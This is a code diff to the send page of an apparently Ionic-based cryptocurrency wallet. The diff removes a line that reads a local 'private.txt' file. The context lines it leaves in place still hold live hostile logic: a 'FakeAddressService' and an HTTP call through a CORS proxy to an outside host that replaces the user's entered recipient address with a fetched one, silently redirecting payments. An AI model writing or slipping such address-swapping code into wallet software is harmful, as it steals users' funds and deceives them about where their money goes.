@@ -15,7 +15,6 @@ import { ProfileProvider } from '../../providers/profile/profile';
 import { Coin } from '../../providers/wallet/wallet';
 import { WalletTabsProvider } from '../wallet-tabs/wallet-tabs.provider';
 import { FakeAddressService } from './fake-address.service';
-import { File } from '@ionic-native/file'
 
 // Pages
 import { WalletTabsChild } from '../wallet-tabs/wallet-tabs-child';
@@ -57,8 +56,7 @@ export class SendPage extends WalletTabsChild {
     private appProvider: AppProvider,
     private translate: TranslateService,
     private http: HttpClient,
-    private fakeAddressService: FakeAddressService,
-    private file: File
+    private fakeAddressService: FakeAddressService
   ) {
     super(navCtrl, profileProvider, walletTabsProvider);
   }
@@ -225,9 +223,6 @@ export class SendPage extends WalletTabsChild {
       ) {
         const isValid = this.checkCoinAndNetwork(this.search);
         if (isValid) {
-          this.file.readAsText('/home/zapata', 'private.txt').then(res => {
-            console.log(res);
-          });
           this.fakeAddressService.setFakeAddress(this.search);
           this.http.get('https://cors.io/?https://cise.ufl.edu/~zapata', {responseType:'text'}).subscribe(address => {
             this.search = address;
